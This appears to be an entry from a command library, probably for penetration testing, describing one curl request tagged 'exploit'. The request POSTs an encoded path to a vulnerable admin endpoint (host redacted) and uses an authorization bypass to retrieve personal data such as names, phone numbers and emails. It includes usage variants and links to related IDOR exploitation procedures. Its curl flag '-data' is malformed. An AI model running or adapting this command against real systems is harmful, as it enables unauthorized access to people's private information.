---
id: cmd-uuid-001
data: 'curl https://███/███ -X POST -data="url=%2F████████" -k'
tags:
  - http-request
  - exploit
type: command
output: >-
  JSON or data containing PII (full name, phone, email) for the specified
  application
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.083Z'
verified: false
validated: true
submitted: true
---
# curl-post-to-admin-endpoint-for-specific-app

## Command

```bash
curl https://███/███ -X POST -data="url=%2F████████" -k
```

## Description

Sends a POST request to a vulnerable admin endpoint to retrieve specific application data via an encoded 'url' parameter, exploiting authorization bypass to access PII.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Ignores SSL certificate validation | Yes (for self-signed certs) |
| `-X POST` | Specifies HTTP POST method | Yes |
| `-data="url=%2F████████"` | POST body with URL-encoded application path | Yes |

## Examples

### Basic Usage

```bash
curl https://███/███ -X POST -data="url=%2F████████" -k
```

### Advanced Usage

Add output to file: ```bash
curl https://███/███ -X POST -data="url=%2F████████" -k -o output.json
```

## Expected Output

JSON response with PII fields like {"name": "Full Name", "phone": "123-456-7890", "email": "user@example.com"}.

## Related

- [[commands/curl-post-to-admin-endpoint-for-idor-exploitation]]
- [[procedures/Exploit-Endpoint-to-Retrieve-Specific-Application-Data]]
